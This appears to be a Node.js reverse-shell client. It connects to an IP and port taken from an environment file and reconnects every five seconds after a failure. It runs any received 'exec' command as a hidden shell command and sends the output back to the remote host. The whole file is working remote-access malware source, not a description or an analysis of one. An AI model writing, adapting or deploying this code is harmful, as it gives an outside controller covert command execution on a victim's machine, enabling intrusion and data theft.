import net from "net";
import util from "util";
import child_process from "child_process";
import process from "process";
import changeDir from "./shell.js";
import dotenv from "dotenv";

dotenv.config({ path: "../config/.env" });

const exec = util.promisify(child_process.exec);
let path = process.cwd();

const PORT = process.env.PORT;
const IP = process.env.IP;

const client = new net.Socket();
let intervalConnect = false;

function connect() {
	client.connect({
		port: PORT,
		host: IP,
	});
}

function launchIntervalConnect() {
	if (false != intervalConnect) return;
	intervalConnect = setInterval(connect, 5000);
}

function clearIntervalConnect() {
	if (false == intervalConnect) return;
	clearInterval(intervalConnect);
	intervalConnect = false;
}

client.on("data", (data) => {
	const dataStr = data.toString().toLowerCase();

	async function execute(command) {
		await exec(
			command,
			{ cwd: path, windowsHide: true },
			(e, stdout, stderr) => {
				client.write(`${stdout}\n`);
			}
		);
	}

	if (dataStr.startsWith("exec")) {
		if (dataStr.split(" ")[1] === "cd") {
			path = changeDir(data, path);
		}
		execute(dataStr.replace("exec", ""));
	}
});

client.on("connect", () => {
	clearIntervalConnect();
	client.write("CLIENT connected");
});

client.on("error", (err) => {
	launchIntervalConnect();
});
client.on("close", launchIntervalConnect);
client.on("end", launchIntervalConnect);

connect();
